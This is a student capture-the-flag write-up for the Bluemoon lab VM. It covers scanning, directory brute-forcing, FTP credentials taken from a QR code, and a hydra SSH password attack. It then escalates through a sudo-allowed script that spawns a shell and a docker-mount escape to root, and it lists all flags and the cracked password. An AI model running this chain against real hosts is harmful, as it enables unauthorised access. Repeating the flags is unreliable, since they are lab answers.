Lab Week 2 - Bluemoon 
User-1 Flag = Fl4g{u5er1r34ch3d5ucc355fully}
User-2 Flag = Fl4g{Y0ur34ch3du53r25uc355ful1y}
Root Flag = Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}

## 1. `sudo netdiscover` - found 192.168.56.100 and 192.168.56.101 
<img width="815" height="228" alt="image" src="https://github.com/user-attachments/assets/b83cfc3b-b722-4763-acf9-7ac7e337c0cc" />


## 2. ```nmap -sC -sV -Pn 192.168.56.100 192.168.56.101``` - found port 80 is open 
<img width="817" height="504" alt="image" src="https://github.com/user-attachments/assets/d0a78e50-b035-4794-881d-eb45fee93684" />


## 3. index.html 
<img width="1509" height="788" alt="image" src="https://github.com/user-attachments/assets/dd2a585a-3432-4d1f-8400-e96c29495fd6" />


## 4. `gobuster dir -u 192.168.56.101 --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html` 
<img width="1920" height="1068" alt="image" src="https://github.com/user-attachments/assets/76b196ee-90a3-46ed-83b6-ff207af1af4e" />


## 5. found a hidden_text page which had a hyperlink embedded in "Thank You" 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/fffa960f-2e2f-411d-a9d3-c10e77c65eef" />


## 6. qr code from the link 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f09066dc-a621-4cc8-b08f-420ef96558fc" />


## 7. Decode the QR and found credentials for ftp 
<img width="896" height="651" alt="image" src="https://github.com/user-attachments/assets/e9b614f7-afb3-4e3f-9c7b-86b9ce3a230c" />


## 8. `ftp 192.168.56.101` and insert credentials found from decoded qr then run `ls`
<img width="1920" height="1075" alt="image" src="https://github.com/user-attachments/assets/9839b3f1-9574-4fb1-a107-35f479e28eb1" />

- found 2 files: information.txt and p_lists.txt



## 8. information.txt and p_lists.txt which is a list of passwords 
<img width="1920" height="1071" alt="image" src="https://github.com/user-attachments/assets/dc4576f5-654e-43e4-9265-3f7e76191054" />


## 9. `hydra -l robin -P p_lists.txt ssh://192.168.56.101 `
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/fa988fc6-cd2f-409c-9252-bd278b9c079d" />

- login: robin 
- password: **k4rv3ndh4nh4ck3r**


## 10. `ssh robin@192.168.56.101` and enter password which was k4rv3ndh4nh4ck3r to access bluemoon as robin
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b5d19f47-b6f7-4d43-8265-329b3d112854" />

run *`ls`* and found user1.txt which contains the 1st flag : **Fl4g{u5er1r34ch3d5ucc355fully}**


## 11. `sudo -l`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b31dd93e-f899-4829-9f9d-28f25ad8a237" />


- saw the name jerry and the file feedback.sh
- *`cd project`* *`-cat feedback.sh`*
- feedback.sh is accessible by jerry


## 12. user-2 flag - `sudo -u jerry ./feedback.sh`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0169e443-c09b-4eea-b9d9-012485d10da9" />

- name: jerry
- Enter Feedback: /bin/bash
- ran *`whoami`* and it said jerry
- *`ls`* and saw user2.txt
- found 2nd flag : **Fl4g{Y0ur34ch3du53r25uc355ful1y}**


## 13. root flag
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/33d8d2d9-8274-4e41-84e6-58647068a9f5" />

- run *`id`*
- run *`docker run -v /:/mnt --rm -it alpine chroot /mnt sh `* to gain root access
- ran *`whoami`* and it said root
- *`cd /root`* 
- *`ls`* found root.txt
- found root flag : **Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}**

